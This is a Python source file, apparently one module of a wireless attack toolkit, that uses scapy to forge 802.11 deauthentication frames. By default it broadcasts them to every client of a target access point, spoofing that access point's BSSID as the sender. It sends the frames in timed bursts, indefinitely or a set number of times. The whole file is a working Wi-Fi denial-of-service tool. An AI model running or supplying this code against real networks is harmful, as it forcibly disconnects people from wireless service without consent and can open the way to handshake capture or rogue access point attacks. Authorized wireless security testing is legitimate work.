from scapy.layers.dot11 import Dot11, Dot11Deauth, RadioTap
from scapy.sendrecv import sendp
from helpers.helper_functions import *
import time

def run(interface : str, bssid : str, mac : str, time_period: float, number : int, burst_number : int):
    if time_period is None:
        time_period = 500

    if number is None:
        number = -1

    if mac is None:
        mac = "FF:FF:FF:FF:FF:FF"
    if burst_number is None:
        burst_number = 1
    dot11 = Dot11(
        addr1=mac,
        addr2=bssid,
        addr3=bssid,
        type=0,
        subtype=12
    )
    deauth_frame = Dot11Deauth(reason=7)

    packet = RadioTap() / dot11 / deauth_frame
    print(f"Sending deauthentification packets in bursts of {burst_number} packets at interval of {time_period} miliseconds.")
    if number == -1:
        print("Packets are sent indefinitely.")
        try:
            while True:
                sendp(packet, iface=interface, verbose=False, count=burst_number)
                time.sleep(time_period / 1000)
        except KeyboardInterrupt:
            print("Ending...")

    else:
        print(f"Packets will be sent {number} times.")
        try:
            for x in range(0, number):
                sendp(packet, iface=interface, verbose=False, count=burst_number)
                time.sleep(time_period / 1000)
            print("Ending...")
        except KeyboardInterrupt:
            print("Ending...")


























